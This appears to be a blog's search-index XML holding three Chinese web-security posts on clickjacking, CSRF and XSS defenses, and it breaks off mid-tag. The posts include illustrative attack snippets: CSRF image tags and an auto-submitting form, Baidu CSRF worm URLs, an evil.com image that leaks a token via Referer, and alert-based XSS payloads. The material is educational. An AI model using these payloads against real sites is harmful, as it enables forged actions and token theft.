<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『跨站脚本攻击』点击劫持</title>
      <link href="/posts/547c.html"/>
      <url>/posts/547c.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>点击劫持是一种视觉上的欺骗手段。</p><p>黑客使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，<br>此时用户将在不知情的情况下点击透明的iframe页面。</p><p>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上，从而使用户完成不知情的操作。</p><h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h2 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h2><p>图片覆盖攻击，Cross Site Image Overlaying攻击，简称XSIO。</p><p>例如，以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://disenchant.ch&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://disenchant.ch/powered.jpg</span></span></span><br><span class="line"><span class="tag"><span class="attr">style</span>=<span class="string">position:absolute;right:320px;top:90px;/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过调整图片的style使得图片能够覆盖在黑客所指定的任意网页位置。</p><p>如果用户打算点击网页的的logo，而此logo已经被黑客的图片所覆盖，那么点击后就会链接到<code>http: //disenchant. ch</code>。如果 <code>http: //disenchant. ch</code> 是钓鱼网站，那用户很可能会上当。</p><h2 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h2><ol><li><p><strong>背景</strong></p><p>很多浏览器都开始支持Drag &amp; Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此<strong>拖拽是不受同源策略限制的</strong>。</p></li><li><p><strong>攻击思路</strong></p><p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中“拖拽”出黑客希望得到的数据，<br>然后放到黑客能控制的另外一个页面中，从而窃取数据。</p><blockquote><p>所以拖拽部分为iframe中黑客想要的数据，即正常的页面。</p><p>放置部分为黑客控制页面，黑客可以从这里获取这部分数据</p></blockquote></li><li><p><strong>例子</strong></p><p>黑客制作了一个网页小游戏，将球拖拽到小海豹的头顶上</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607173659420.png" alt="image-20240607173659420"></p><p>小球和小海豹的头顶都有隐藏的iframe。</p><p>黑客利用event.dataTransfer.getData(‘Text’)来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。</p></li></ol><h2 id="触屏劫持"><a href="#触屏劫持" class="headerlink" title="触屏劫持"></a>触屏劫持</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174131863.png" alt="image-20240607174131863"></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240607174143674.png" alt="image-20240607174143674"></p><h1 id="点击劫持防御"><a href="#点击劫持防御" class="headerlink" title="点击劫持防御"></a>点击劫持防御</h1><p>一般是通过禁止跨域的iframe来防范</p><h2 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h2><p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( top.<span class="property">location</span> != location ) &#123;</span><br><span class="line">    top.<span class="property">location</span> = self.<span class="property">location</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于frame busting是用JS写的，控制能力并不是特别强，因此有许多方法可以绕过它。</p><p>例，对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。</p><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>因为frame busting存在被绕过的可能，一般使用HTTP头——X-Frame-Options来进行防御。</p><p>它有三个可选的值：</p><ul><li>DENY：浏览器会拒绝当前页面加载任何frame页面；</li><li>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</li><li>ALLOW-FROM origin：允许frame加载的页面地址；</li></ul><p>一些浏览器拓展，如Firefox的NoScript扩展也可以防御。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> 点击劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』CSRF攻击</title>
      <link href="/posts/3f8b.html"/>
      <url>/posts/3f8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h1><ul><li><p><strong>定义</strong></p><p>CSRF（Cross Site Request Forgery，跨站点请求伪造）</p><p><strong>通过伪装成受信任用户请求受信任的网站</strong>。对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p></li><li><p><strong>例子</strong></p><p>假设请求这个url可以删除掉编号为156713012的搜狐博客文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/mange/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>假设这个url同时还存在csrf漏洞，我们可以尝试利用这个漏洞，删除掉这篇文章。</p><p>攻击者可以首先在自己的域构造一个页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/csrf.html</span><br></pre></td></tr></table></figure><p>其中包含一个img标签，指向上面的删除博客文章的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot; /&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以诱使博主访问自己构造的页面 <code>http://www.a.com/csrf.html</code>，博主看到的是一个无法显示的图片，此时博客文章已经被删除掉了。</p><p>原因就是：博主在访问该页面的时候，图片标签向搜狐服务器发送了一次GET请求，删除了文章。</p></li></ul><h1 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h1><h2 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h2><p>一般csrf攻击的目标需要使用cookie</p><ol><li><p><strong>浏览器所持有的Cookie分为两种</strong></p><ul><li><p><strong>Session Cookie（临时Cookie）</strong></p><ul><li>没有指定Expire时间，保存在内存中，所以浏览器关闭后，Session Cookie就失效了。</li><li>浏览网站，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，因为新Tab页在同一个浏览器进程中，Session Cookie也都是有效的，因此<strong>Session Cookie将被发送</strong>。</li></ul></li><li><p><strong>Third-party Cookie（本地Cookie）</strong></p><ul><li>服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地</li><li>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，<strong>某些浏览器会阻止Third-party Cookie的发送</strong>。</li></ul><blockquote><p>例如，攻击者可以在自己的域上（b.com&#x2F;csrf.html）构造 <code>iframe</code>、<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 、<code>&lt;link&gt;</code>等标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://www.a.com&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>抓包可以发现，发送出了 <code>Session Cookie</code></p></blockquote></li></ul></li><li><p><strong>每个浏览器的拦截策略不同</strong></p><ul><li><p>火狐默认允许发送本地Cookie：用户访问b.com，利用本地直接发送即可成功</p></li><li><p><a id="t1">IE浏览器不允许发送本地Cookie</a>：需要诱使用户在当前浏览器中先访问<code>http://www.a.com</code>，让Session cookie有效，然后再实施CSRF攻击。</p></li></ul></li></ol><h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>有些CSRF攻击并不需要进行认证，不需要发送cookie</p><ol><li><p><strong>P3P头的定义</strong></p><p>P3P Header（The Platform for Privacy Preferences）是W3C制定的一项关于隐私的标准。</p></li><li><p><strong>P3P头的作用</strong></p><ul><li><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。这种情况下即使是IE的<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签也将不再拦截第三方Cookie的发送。</p></li><li><p>在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，不符合“最小权限”原则。</p></li><li><p>P3P头只需要由网站设置一次即可，滞后每次请求都会遵循此策略，不需要重复设置。</p></li></ul></li><li><p><strong>例子</strong></p><p><code>http://www.b.com/test.html</code> 代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe width=300 height=300 src=&quot;http;//www.a.com/test.php&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在 <code>http://b.com</code> 中请求 <code>test.html</code>，它的 <code>iframe</code> 会告诉浏览器去跨域请求<code>http://http://www.a.com/test.php</code> 。</p><p><code>http://http://www.a.com/test.php</code> 的代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header&#123;&quot;Set-Cookie:test=axis;domain=.a.com;path=/&quot;&#125;; //临时cookie</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>而由于浏览器的同源策略，这里的set-cookie是不会成功的（无论是临时还是本地cookie都不会成功）</p><blockquote><p>注意这里和<a href="#t1">上面的例子</a>的区别：</p><p><strong>同源策略主要限制跨域请求时设置和读取Cookie</strong></p><p>上面的例子是用户主动访问<code>http://www.a.com</code>，这个请求是同源的，因为请求的源（浏览器中当前访问的页面）和目标源（<code>http://www.a.com</code>）是相同的。由于是同源请求，服务器可以成功地设置Session Cookie。浏览器会接受并存储这个Cookie。</p><p>当用户再访问攻击页面（<code>http://www.b.com/csrf.html</code>），这个页面包含一个指向<code>http://www.a.com</code>的<code>&lt;iframe&gt;</code>或其他请求。虽然这个请求是跨域的，但因为Session Cookie已经存在于浏览器中，所以浏览器会自动附带这个Session Cookie发送请求。</p><p>而<strong>这里的例子是跨域请求直接尝试设置Cookie</strong>，所以浏览器会拒绝这个操作，这是同源策略的限制。</p></blockquote><p>但是，在加入P3P头的情况下：P3P头允许跨域访问隐私数据，从而可以跨域set-cookie成功。</p><ul><li><p>正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。</p></li><li><p>很多时候，如果测试CSRF时发现<code>&lt;iframe&gt;</code>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。</p></li></ul></li></ol><h2 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h2><p>大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p><p>但是，这并不表示只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。</p><ul><li><p><strong>情景1：服务器没有区分get和post请求</strong></p><ul><li><p>对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST</code>，而非<code>$_POST</code>变量，则会存在这个问题。</p></li><li><p>例子：</p><p>以下表单</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/register&quot; id=&quot;register&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>用户可以尝试构造一个GET请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure><p><u>如果服务器没有区分get和post请求，那么这个请求会通过。</u></p></li></ul></li><li><p><strong>情景2：服务器区分get和post请求，可以在攻击代码中构造Post</strong></p><ul><li><p>服务器区分get和post请求的情况下，仍然可以在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。</p></li><li><p>例子：</p><p><code>http://www.b.com/test.html</code> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</span><br><span class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById(&quot;register&quot;);</span><br><span class="line">f.inputs[0].value = &quot;test&quot;;</span><br><span class="line">f.inputs[1].value = &quot;passwd&quot;;</span><br><span class="line">f.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以<strong>将这个页面隐藏在一个不可见的iframe窗口中</strong>，那么整个自动提交表单的过程，对于用户来说也是不可见的。可以成功实现攻击（前提是获取到了cookie）</p></li></ul></li></ul><h2 id="CSRF-worm"><a href="#CSRF-worm" class="headerlink" title="CSRF worm"></a>CSRF worm</h2><p>2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。 漏洞出现在百度用户中心的发送短消息功能中：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=用户账户&amp;co=消息内容</span><br></pre></td></tr></table></figure><p>只需要修改参数sn，即可对指定的用户发送短消息。</p><p>百度的另外一个接口则能查询出某个用户的所有好友：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://frd.baidu.com/?ct=28&amp;un=用户账户&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends</span><br></pre></td></tr></table></figure><p>将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。</p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><ol><li><p><strong>概念</strong></p><p>验证码被认为是对抗CSRF攻击<strong>最简洁而有效的防御方法</strong>。 </p><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。</p></li><li><p><strong>缺点</strong></p><ul><li>但是很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。</li></ul><p>因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p></li></ol><h2 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h2><ol><li><p><strong>概念</strong></p><p>常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。</p><p>例，一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。</p></li><li><p><strong>缺点</strong></p><ul><li>服务器并非什么时候都能取到Referer。</li><li>很多用户出于隐私保护的考虑，限制了Referer的发送。</li><li>在某些情况下，浏览器也不会发送Referer。例如：从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。</li></ul><p>无法依赖于Referer Check作为防御CSRF的主要手段，可以通过Referer Check来监控CSRF攻击的发生。</p></li></ol><h2 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h2><p>目前<strong>业界针对CSRF的防御</strong>，一致的做法是使用Token</p><ol><li><p><strong>为什么使用Token</strong></p><p>CSRF能够攻击成功，其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</p><p>出于这个原因，可以想到一个解决方案：<strong>把参数加密，或者使用一些随机数</strong>，从而让攻击者无法猜测到参数值，这就是token</p></li><li><p><strong>具体方法</strong></p><p>URL中，保持原参数不变，新增一个参数Token，值随机且不可预测：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</span><br></pre></td></tr></table></figure><p>Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器，且为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。</p><p>由于Token的存在，黑客无法再构造出一个完整的URL实施CSRF攻击。</p><p>在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。</p></li><li><p><strong>Token的使用原则</strong></p><ul><li><p>Token的生成一定要足够随机</p></li><li><p>设置一个用户的有效生命周期，在Token消耗掉前都使用同一个Token。</p><blockquote><p>如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。</p><p>如果Token保存在Cookie中，而不是服务器端的Session中，一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑<strong>生成多个有效的Token，以解决多页面共存的场景</strong>。</p></blockquote></li><li><p>保密性</p><ul><li><p><strong>Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。</strong></p><p>在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交。</p><p>例子：</p><p>以下是一个页面中删除操作的URL</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/path/manage?username=abc&amp;token=[random] </span><br></pre></td></tr></table></figure><p>如果这个页面包含了一张攻击者能指定地址的图片：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</span><br></pre></td></tr></table></figure><p>那么，当浏览器尝试加载这张图片时，会向 <code>http://evil.com</code> 服务器发送一个请求。在这个请求的HTTP头中，会包含Referer字段，其值为上面代表删除操作的URL。</p><p>攻击者通过查看Referer字段的内容，即可获取到包含敏感Token的URL，从而导致Token泄露。</p><blockquote><p>url中不是已经泄露了token嘛，为什么还要靠referer字段来获取token?</p><p>因为url中的token只有用户自己能看到，而后面的图片加载将url写入referer，让攻击者可以接收到对应操作中的token </p></blockquote></li><li><p>还有其他的可能导致token泄露的方法，如XSS、跨域漏洞等</p><blockquote><p>CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。 </p><p>在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。 这个过程可以称之为XSRF，和CSRF以示区分。</p></blockquote></li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> CSRF攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』CSRF攻击</title>
      <link href="/posts/ceb6.html"/>
      <url>/posts/ceb6.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何对XSS攻击进行防御</p><h1 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h1><ol><li><p>定义：浏览器禁止页面的JS访问带有HttpOnly属性的Cookie。</p><blockquote><p>HttpOnly并非防止出现XSS，而是防御XSS后的Cookie劫持攻击。</p></blockquote></li><li><p>作用方式</p><p>在服务器对浏览器的请求进行回复，Set-Cookie时对cookie进行标记，服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie值上，因此可以仅将其加在用于认证的关键cookie上面。</p></li></ol><h1 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h1><ol><li><p>定义：</p><p>目前Web开发的普遍做法，是同时在<strong>客户端JavaScript</strong>中和<strong>服务器端代码</strong>中实现相同的输入检查。</p><blockquote><p>原因：</p><ul><li><strong>客户端检查提高用户体验</strong>：在客户端进行输入验证可以即时反馈错误信息给用户，无需等待服务器响应。节约了服务器资源的同时，也可以快速指导用户纠正错误，提高整体的用户体验。</li><li><strong>服务端检查保障安全性</strong>：尽管客户端验证可以提供即时反馈，但它<strong>可以被绕过</strong>。用户可以修改客户端代码，或者直接通过HTTP请求工具发送请求绕开客户端。因此，<strong>服务端验证是必不可少</strong>的，它保证了即使客户端验证被绕过，服务端仍然能够保护应用免受恶意数据的影响。</li></ul></blockquote></li><li><p>作用方式：存在比较多的开源xssfilter</p></li><li><p>局限性</p><p>1）<strong>语境</strong></p><p>XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。</p><blockquote><p>例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;$var&quot; &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>$var</code>是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。</p><p>如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。</p></blockquote><p>2）<strong>字符处理</strong></p><p>如果仅仅是对 <code>&lt;</code>、<code>&quot;</code> 等字符进行粗暴的转义或替换处理，可能会改变用户数据的语义。</p></li></ol><h1 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h1><h2 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h2><ol><li><p><strong>可以使用编码函数对输出中的敏感符号进行转义</strong></p><p>例如：JavascriptEncode对除数字、字母以外的所有字符，使用十六进制的方式进行编码。</p><p>还有很多的编码函数，如XMLEncode、JSONEncode等。</p></li><li><p><strong>在转义的时候要关注上下文环境</strong></p><p>不同的上下文环境（HTML文档结构和JavaScript程序逻辑）对数据的解析方式不同。如果在不适当的上下文中使用错误的转义方法，可能不会产生预期的防护效果，仍然允许XSS攻击的发生。所以要<strong>在正确的地方使用正确的编码方式</strong>。</p><p>例如：</p><p>a. <strong>初始HTML代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&#x27;$var&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里的意图是在用户点击链接时弹出变量<code>$var</code>的内容。</p><p>b. <strong>用户输入和攻击向量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">$var = htmlencode(&quot;&#x27;);alert(&#x27;2&quot;);</span><br></pre></td></tr></table></figure><p>用户通过输入特制的字符串试图结束原有的<code>alert</code>函数调用，并开始一个新的<code>alert</code>函数，实际上注入了额外的JavaScript代码。</p><p>c. <strong>HTML编码应用后的结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;body&gt;</span><br><span class="line">&lt;a href=# onclick=&quot;alert(&#x27;&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里，虽然特殊字符被HTML编码，看似安全，但问题在于浏览器的解析顺序。</p><p><strong>浏览器解析流程</strong>:</p><ul><li><strong>HTML解析器（HTMLParser）</strong>优先运行，它会解码HTML实体，从而恢复JavaScript代码中的特殊字符。</li><li><strong>JavaScript解析器（JavaScript Parser）</strong>随后执行，此时JavaScript代码已经被“修复”成可以执行的形式。</li></ul><p>因此，最终执行的JavaScript为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">alert(&#x27;&#x27;);alert(&#x27;2&#x27;);</span><br></pre></td></tr></table></figure><p>这实现了攻击者的目的：在页面中注入了额外的JavaScript代码。</p></li></ol><h1 id="各种场景下的XSS防御"><a href="#各种场景下的XSS防御" class="headerlink" title="各种场景下的XSS防御"></a>各种场景下的XSS防御</h1><p>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p><p>下面用变量“$var”表示用户数据，它将被填充入HTML代码中。</p><p>可能存在以下场景：</p><h2 id="在HTML标签中输出"><a href="#在HTML标签中输出" class="headerlink" title="在HTML标签中输出"></a>在HTML标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>对变量使用HtmlEncode。</p></li></ul><h2 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span 